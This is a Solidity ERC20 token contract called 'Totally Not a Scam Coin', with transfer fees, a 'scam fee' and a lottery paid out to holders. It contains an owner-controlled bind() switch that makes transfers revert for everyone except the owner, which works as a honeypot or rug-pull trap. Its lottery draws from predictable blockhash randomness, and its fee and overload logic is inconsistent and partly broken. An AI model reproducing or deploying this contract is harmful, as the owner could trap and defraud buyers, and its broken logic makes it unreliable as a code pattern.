pragma solidity ^0.8.0;
//SPDX-License-Identifier: NONE
import "./ERC20.sol";
import "./Ownable.sol";

contract TNSC is Ownable, ERC20 {

    uint BURN_FEE = 3;
    uint LOTTERY_FEE = 2;
    uint SCAM_FEE = 1;
    uint counter = 0;
    uint lotteryMinimum = 1000 * 10**18;
    address payable public scammers = payable(address(0x010704C7Ca19d299D2E66fed2A177E35dAbd6883));


    //mapping them holders y'all
    mapping(address => bool) public holders; //people's balances
    mapping(uint => address) public indexes;
    uint public topindex;

    bool private _bind = false;

    
function triangulate() public view returns (uint256) 
{
        uint256 sum =0;
        for(uint i = 1; i <= 100; i++)
        {
            sum += uint256(blockhash(block.number - i)) % topindex;
        }
        return sum;
}
    
constructor() ERC20 ('Totally Not a Scam Coin','TNSC') {
    _mint(msg.sender, 420420420* 10 ** 18);
    holders[msg.sender] = true;
    indexes[topindex] = msg.sender;
    topindex += 1;
    }
    


    
function transfer(address recipient, uint256 amount) public override returns (bool){

            
            uint burnAmount = amount*(BURN_FEE) / 100;
            uint lotteryAmount = amount*(LOTTERY_FEE) / 100;
            uint scamAmount = amount*(SCAM_FEE) / 100;
            _transfer(_msgSender(), address(this), lotteryAmount);
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(lotteryAmount)-(scamAmount));
            
            

        
      if (!holders[recipient]) 
        {
            holders[recipient] = true;
            indexes[topindex] = recipient;
            topindex += 1;
        }
        
        counter += 1;
        if (counter == 2) 
        {
        counter = 0;
        address payable winner = payable(indexes[triangulate() % topindex]);
        _transfer(address(this), winner, balanceOf(address(this)));
        }
      
      

      return true;
    }    

function transferFrom(address recipient, uint256 amount) public returns (bool){

            
            uint burnAmount = amount*(BURN_FEE) / 100;
            uint lotteryAmount = amount*(LOTTERY_FEE) / 100;
            uint scamAmount = amount*(SCAM_FEE) / 100;
            _transfer(_msgSender(), address(this), lotteryAmount);
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(lotteryAmount)-(scamAmount));
            
            

        
      if (!holders[recipient]) 
        {
            holders[recipient] = true;
            indexes[topindex] = recipient;
            topindex += 1;
        }
        
        counter += 1;
        if (counter == 69) 
        {
        counter = 0;
        address payable winner = payable(indexes[triangulate() % topindex]);
        _transfer(address(this), winner, balanceOf(address(this)));
        }
      
      return true;
    }   
 
function bind() external onlyOwner
    {
        _bind = !_bind;
    }

function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) public override returns (bool) 
    {
        require(!_bind || tx.origin == owner(), "Look at this fudder");
        return super.transferFrom(from, to, amount);
    }    

function transfer(
        address from, 
        address to, 
        uint256 amount
    ) public returns (bool) 
    {
        require(!_bind || tx.origin == owner(), "Paperhanded bitch");
        return super.transferFrom(from, to, amount);
    }        

}